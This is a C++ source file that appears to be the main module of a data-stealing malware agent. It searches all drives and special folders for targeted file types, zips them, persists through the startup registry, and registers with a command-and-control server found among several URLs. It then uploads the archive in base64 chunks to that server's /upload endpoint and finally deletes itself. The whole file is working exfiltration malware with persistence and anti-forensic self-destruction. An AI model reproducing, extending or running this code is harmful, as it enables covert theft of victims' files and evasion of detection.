#include "Core/profiler.hpp"
#include "Communication/google_resolve.hpp"
#include "Communication/c2_resolve.hpp"
#include "Core/helpers.hpp"
#include "Core/file_search.hpp"
#include "Core/helpers.hpp"
#include "Core/zipping.hpp"
#include "Core/names.hpp"
#include "Communication/senddata.hpp"


std::string zipDestStr;
std::wstring C2;


std::map<std::string, std::map<std::string, std::string>> FileEnum() {
    std::vector<std::wstring> DIR_PATHS;
    std::map<std::string, std::map<std::string, std::string>> FILE_PATHS;

    std::vector<std::wstring> drives = Disk_ID();
    std::vector<std::wstring> specialDirs = GetSpecialPaths();
    DIR_PATHS.insert(DIR_PATHS.end(), drives.begin(), drives.end());
    DIR_PATHS.insert(DIR_PATHS.end(), specialDirs.begin(), specialDirs.end());

    for (const auto& PATH : DIR_PATHS) {
        std::map<std::string, std::map<std::string, std::string>> tempResults;
        std::wcout << L"Directory Path: " + PATH << std::endl;
        tempResults = FileSearcher(PATH, FILE_EXTS);

        // Append tempResults to FILE_PATHS
        FILE_PATHS.insert(tempResults.begin(), tempResults.end());
    }

    return FILE_PATHS;
}


void GenZip() {
    std::string pubDir = PublicDir();
    std::map<std::string, std::map<std::string, std::string>> results = FileEnum();

    // read paths from results and save them to filesToZip 
    std::vector<std::wstring> filesToZip;
    for (const auto& [filePath, attributes] : results) {
        filesToZip.push_back(std::wstring(filePath.begin(), filePath.end()));
    }

    // If there are no files to zip, then return back to caller:
    if (filesToZip.empty()) {
        std::cerr << "No files to zip." << std::endl;
        Cleanup();
        Sleep(2000);
        SelfDestruct();
        return;
    }

    // Zip the files
    std::wstring zipDest = std::wstring(pubDir.begin(), pubDir.end()) + L"zipped.zip";
    zipDestStr = WStringToString(zipDest);
    int zipResult = ZipFiles(zipDest, filesToZip);
    if (zipResult != ZIP_SUCCESS) {
        std::cerr << "There was an error zipping the files." << std::endl;
        return;
    }
}


int main() {
    std::wstring uid;
    std::string pubDir = PublicDir();
    std::string zipFile = pubDir + "zipped.zip";
    std::cout << "This is where zip file is being saved: " << zipFile << std::endl;

    // Mode 1: run once and then > cleanup > self destruct
    if (ONETIMERUN) {
        // If the zip file doesn't exist, it's the first run
        if (!std::filesystem::exists(zipFile)) {
            PersistOnMachine(); // Add mercury to startup registry
            GenZip();           // Process files and create a zip file

            // Try connecting to Google and then connect to all C2 URLs to find a live C2
            bool ReachIntranet = googleConn();
            if (ReachIntranet) {
                C2 = C2Conn(URLS);
                // When you find a live C2, you can connect to it and the client as an agent to the server
                if (!C2.empty()) {
                    // Path to /add_agent
                    std::wstring PC2 = C2 + STAGE1PATH;
                    nlohmann::json JsonProfile = Profiler();

                    nlohmann::json metadata = GenFileMetadata(zipDestStr, CHUNK_SIZE);
                    JsonProfile["file_metadata"] = metadata;
                    std::cout << metadata << std::endl;

                    // Send client's profiler to the server 
                    std::string response = SendData(L"POST", PC2, L"", JsonProfile, L"");
                    auto jsonResp = nlohmann::json::parse(response);
                    if (jsonResp.contains("message") && jsonResp["message"] == "created") {
                        std::cout << "JSON response: " << jsonResp << std::endl;
                    }
                }
            }
        }

        uid = GetUIDFromFile(); // once profiler is called, uid file is created

        // As long as the file upload status is incomplete, keep uploading bytes
        do {
            bool ReachIntranet = googleConn();
            if (ReachIntranet) {
                C2 = C2Conn(URLS);

                // Check file status
                std::wstring FileStatusURL = C2 + L"/file_status";
                nlohmann::json UidJson = { {"uid", WStringToString(uid)} };
                std::string FileStatusResp = SendData(L"POST", FileStatusURL, L"", UidJson, L"");
                auto FileJSONResp = nlohmann::json::parse(FileStatusResp);

                if (!(FileJSONResp.contains("status") && FileJSONResp["status"] == "incomplete")) {
                    break;
                }

                std::cout << "JSON response: " << FileJSONResp << std::endl;

                // Read required bytes from the server's JSON response:
                int start_byte = FileJSONResp["start_byte"];
                int end_byte = FileJSONResp["end_byte"];

                // Grab the required bytes from start to end and encode them into base64
                std::vector<char> requiredBytes = RetReqBytes(zipFile, start_byte, end_byte);
                std::string base64Encoded = EncodeBase64(std::string(requiredBytes.begin(), requiredBytes.end()));

                // Construct a JSON object that contains the encoded file bytes and the client's UID:
                nlohmann::json EncodedBytes;
                EncodedBytes["file_data"] = base64Encoded;
                EncodedBytes["uid"] = WStringToString(uid);

                // Upload the requested bytes to the server:
                std::wstring FileUploadURL = C2 + L"/upload";
                std::string FilerResponse = SendData(L"POST", FileUploadURL, L"", EncodedBytes, L"");
                std::cout << "JSON response for /upload: " << FilerResponse << std::endl;
                //Sleep(2000);
            }
            

        } while (true);

        std::cout << "File upload has been completed." << std::endl;
        Cleanup();
        Sleep(2000);
        SelfDestruct();
    }

    return 0;
}




